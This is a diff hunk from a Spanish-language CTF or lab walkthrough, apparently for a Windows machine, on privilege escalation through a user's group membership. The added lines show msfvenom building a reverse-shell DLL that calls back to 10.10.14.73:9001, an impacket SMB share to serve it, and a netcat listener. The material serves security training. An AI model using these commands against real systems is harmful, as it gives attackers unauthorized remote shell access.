@@ -137,7 +137,13 @@ el usuario `ryan` pertenece al grupo `constructors` el cual a su ves pertenece a
 para realizar esta explotación primero vamos a crear un `archivo.dll` que contenga una reverse shell con `msfvenom` luego vamos a crear una carpeta compartida con `impacket-smbserver` y finalmente estaremos a la escucha
 
 ```python
+❯ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.73 LPORT=9001 -f dll -o pwned.dll
 
+❯ impacket-smbserver SmbFolder $(pwd) -smb2support
+
+❯ rlwrap -cAr nc -lvnp 9001
+
+ # detenemos el servi
 ```
 
 ![[Pasted image 20240723003958.png]]
